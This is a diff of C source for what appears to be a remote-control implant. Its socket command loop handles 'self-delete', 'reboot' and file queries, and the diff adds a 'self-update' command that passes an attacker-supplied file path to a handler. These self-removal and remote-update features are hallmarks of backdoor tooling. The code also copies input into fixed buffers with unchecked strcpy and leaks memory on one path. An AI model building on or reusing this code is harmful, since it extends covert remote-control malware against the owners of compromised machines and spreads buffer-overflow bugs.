@@ -248,18 +248,51 @@ ACCEPT:
 			strcpy(remainder_copy, space_pos_delete + 1);
 
 			// First token is the filename
-			char * FileNameToDelete = remainder_copy;
-			if (FileNameToDelete == NULL) {
+			char * FileName = remainder_copy;
+			if (FileName == NULL) {
 			    perror("[x] Missing filename");
 			    continue;
 			}
-			printf("[+] File to get date will be %s\n",FileNameToDelete);	//DEBUG
-			HandleGetFileDate(cmd, client_socket, FileNameToDelete);
+			printf("[+] File to get date will be %s\n",FileName);	//DEBUG
+			HandleGetFileDate(cmd, client_socket, FileName);
 			continue;
 
 		}
 		else if (strcmp(cmd,"self-delete") == 0){
 			HandleSelfDelete(cmd,client_socket);
+			continue;
+		}
+		else if (strncmp(cmd,"self-update",11) == 0){
+
+			char cmd_copy[BUFFER_SIZE];
+			strcpy(cmd_copy,cmd);
+			char* space_pos_upload = strchr(cmd_copy, ' ');
+			if (space_pos_upload == NULL) {
+				continue;
+			}
+			//printf("[+] cmd = %s\ncmd_copy=%s\n", cmd, cmd_copy);		//DEBUG
+			// 
+			// will use basename() to get the filename to write with linux fs bullshit
+
+			char *FilePath = (char *) malloc(sizeof(char) * BUFFER_SIZE);
+			strcpy(FilePath, space_pos_upload + 1);
+			
+
+			// First token is the filename
+			char * FileNameToUpload  = basename(FilePath);
+			if (FileNameToUpload == NULL) {
+			    printf("[x] Missing filename\n");
+			    continue;
+			}
+
+
+			printf("[+] FilePath variable is %s\n",FilePath);
+			printf("[+] The file with basename() is %s\n",FileNameToUpload);
+
+
+
+			HandleSelfUpdate(cmd,client_socket,FilePath);
+			free(FilePath);
 			continue;
 		}
 		else if ( strcmp(cmd,"reboot") == 0){
